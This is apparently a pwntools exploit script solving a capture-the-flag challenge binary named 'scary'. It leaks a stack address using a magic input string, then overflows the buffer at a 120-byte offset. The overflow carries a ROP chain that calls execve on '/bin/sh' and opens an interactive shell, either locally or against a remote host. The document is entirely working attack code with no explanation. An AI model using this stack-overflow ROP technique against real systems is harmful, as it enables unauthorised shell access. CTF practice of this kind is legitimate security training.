#!/usr/bin/env python3

from pwn import ELF, process, ROP, remote, ssh, gdb, cyclic, cyclic_find, log, p64, u64, xor

LOCAL_BIN = "../files/scary"
LOCAL = True

if LOCAL:
    P = process(LOCAL_BIN, env={})
    ELF_LOADED = ELF(LOCAL_BIN)
    ROP_LOADED = ROP(ELF_LOADED)
else:
    P = remote('10.10.2.11',15654)
    ELF_LOADED = ELF(LOCAL_BIN)
    ROP_LOADED = ROP(ELF_LOADED)

#0x0000000000401481: pop rax; ret;
#0x0000000000401483: pop rdi; ret;
#0x0000000000401485: pop rsi; ret;
#0x0000000000401489: pop rdx; ret;
#0x000000000040147f: syscall;

POP_RSI = (ROP_LOADED.find_gadget(['pop rsi', 'ret']))[0]
POP_RDX = (ROP_LOADED.find_gadget(['pop rdx', 'ret']))[0]
POP_RDI = (ROP_LOADED.find_gadget(['pop rdi', 'ret']))[0]
POP_RAX = (ROP_LOADED.find_gadget(['pop rax', 'ret']))[0]
SYSCALL = (ROP_LOADED.find_gadget(['syscall']))[0]
SYSCALL_NUM_EXECVE = 0x3b

rip_offset = 120
extra = b"\x00"*64 + b"////bin/sh\x00"
P.send(b"Gh0st  busteRz" + b"\n\x00" + extra) # leaked addr+24 has our extra data
leak = int(P.recvregex(b"Peter is calling the Ghostbusters\.\.\. Their number is\: ([0-9a-fA-F]*)\n", capture=True).group(1),16)
print(hex(leak))
print(P.clean())
# only xoring until null byte, strlen, therefore manually inserting before rip
payload = b"A"*(rip_offset-1)+ b"\x00" + p64(POP_RAX) + p64(SYSCALL_NUM_EXECVE) + p64(POP_RDI) + p64(leak+25+64) + p64(POP_RSI) + p64(0) + p64(POP_RDX) + p64(0) +  p64(SYSCALL)
P.sendline(payload)
P.interactive()